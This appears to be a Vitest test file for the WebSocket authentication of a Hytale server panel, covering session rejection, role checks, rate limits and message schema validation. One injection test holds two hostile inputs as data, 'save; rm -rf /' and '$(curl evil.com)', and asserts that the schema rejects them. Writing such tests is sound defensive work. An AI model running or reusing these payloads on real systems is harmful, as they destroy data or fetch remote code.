import { describe, it, expect } from 'vitest';
import { z } from 'zod';
import {
  WS_MAX_CONNECTIONS_PER_SESSION,
  WS_MESSAGE_RATE_LIMIT_PER_SEC,
  WS_HEARTBEAT_INTERVAL_MS,
  WS_CAPTURE_POLL_INTERVAL_MS,
  MAX_COMMAND_LENGTH,
  COMMAND_CHAR_ALLOWLIST,
} from '@hytale-panel/shared';

/**
 * WebSocket Auth Tests
 * Tests unauthenticated rejection, session validation,
 * role-based command access, rate limiting, and message validation.
 */

const ClientWsMessageSchema = z.discriminatedUnion('type', [
  z.object({ type: z.literal('subscribe') }),
  z.object({
    type: z.literal('command'),
    data: z.string().min(1).max(MAX_COMMAND_LENGTH)
      .refine((val) => COMMAND_CHAR_ALLOWLIST.test(val), { message: 'Command contains disallowed characters' }),
  }),
  z.object({ type: z.literal('pong') }),
]);

describe('WebSocket Auth — Connection Rejection', () => {
  it('should reject connections without session cookie', () => {
    const sessionId = undefined;
    const shouldReject = !sessionId;
    expect(shouldReject).toBe(true);
  });

  it('should reject connections with empty session cookie', () => {
    const sessionId = '';
    const shouldReject = !sessionId;
    expect(shouldReject).toBe(true);
  });

  it('should reject connections with invalid session', () => {
    // Simulates validateSession returning { valid: false }
    const sessionResult = { valid: false };
    const shouldReject = !sessionResult.valid;
    expect(shouldReject).toBe(true);
  });

  it('should reject connections with pending 2FA session', () => {
    // Sessions with pending2fa should not be allowed WebSocket access
    const sessionResult = { valid: false, pending2fa: true };
    const shouldReject = !sessionResult.valid;
    expect(shouldReject).toBe(true);
  });

  it('should accept connections with valid authenticated session', () => {
    const sessionResult = { valid: true, user: { id: 'uuid', username: 'admin', role: 'admin' } };
    const shouldAccept = sessionResult.valid && sessionResult.user;
    expect(shouldAccept).toBeTruthy();
  });
});

describe('WebSocket Auth — Role-Based Command Access', () => {
  it('should allow admin users to send commands', () => {
    const user = { role: 'admin' };
    const canSendCommand = user.role === 'admin';
    expect(canSendCommand).toBe(true);
  });

  it('should deny readonly users from sending commands', () => {
    const user = { role: 'readonly' };
    const canSendCommand = user.role === 'admin';
    expect(canSendCommand).toBe(false);
  });

  it('should allow readonly users to subscribe (view console)', () => {
    // Subscribe is allowed for all authenticated users
    const user = { role: 'readonly' };
    const canSubscribe = true; // No role check for subscribe
    expect(canSubscribe).toBe(true);
  });
});

describe('WebSocket Auth — Message Validation', () => {
  it('should reject invalid JSON', () => {
    expect(() => JSON.parse('not json')).toThrow();
  });

  it('should reject messages without type field', () => {
    expect(() => ClientWsMessageSchema.parse({ data: 'test' })).toThrow();
  });

  it('should reject messages with unknown type', () => {
    expect(() => ClientWsMessageSchema.parse({ type: 'execute' })).toThrow();
    expect(() => ClientWsMessageSchema.parse({ type: 'eval' })).toThrow();
    expect(() => ClientWsMessageSchema.parse({ type: 'shell' })).toThrow();
  });

  it('should reject command messages with injection payloads', () => {
    expect(() => ClientWsMessageSchema.parse({ type: 'command', data: 'save; rm -rf /' })).toThrow();
    expect(() => ClientWsMessageSchema.parse({ type: 'command', data: '$(curl evil.com)' })).toThrow();
  });
});

describe('WebSocket Auth — Rate Limiting', () => {
  it('should enforce rate limit of 10 messages per second', () => {
    expect(WS_MESSAGE_RATE_LIMIT_PER_SEC).toBe(10);
  });

  it('should simulate rate limit enforcement', () => {
    let messageCount = 0;
    let lastReset = Date.now();

    const checkRateLimit = (): boolean => {
      const now = Date.now();
      if (now - lastReset > 1000) {
        messageCount = 0;
        lastReset = now;
      }
      messageCount++;
      return messageCount <= WS_MESSAGE_RATE_LIMIT_PER_SEC;
    };

    // First 10 should pass
    for (let i = 0; i < 10; i++) {
      expect(checkRateLimit()).toBe(true);
    }
    // 11th should fail
    expect(checkRateLimit()).toBe(false);
  });
});

describe('WebSocket Auth — Configuration Constants', () => {
  it('should limit max connections per session to 3', () => {
    expect(WS_MAX_CONNECTIONS_PER_SESSION).toBe(3);
  });

  it('should set heartbeat interval to 30 seconds', () => {
    expect(WS_HEARTBEAT_INTERVAL_MS).toBe(30_000);
  });

  it('should set capture poll interval to 500ms', () => {
    expect(WS_CAPTURE_POLL_INTERVAL_MS).toBe(500);
  });
});

describe('WebSocket Auth — Close Codes', () => {
  it('should use 4001 for unauthorized close', () => {
    // The WS handler uses socket.close(4001, 'Unauthorized')
    const UNAUTHORIZED_CLOSE_CODE = 4001;
    expect(UNAUTHORIZED_CLOSE_CODE).toBeGreaterThanOrEqual(4000);
    expect(UNAUTHORIZED_CLOSE_CODE).toBeLessThan(5000);
  });
});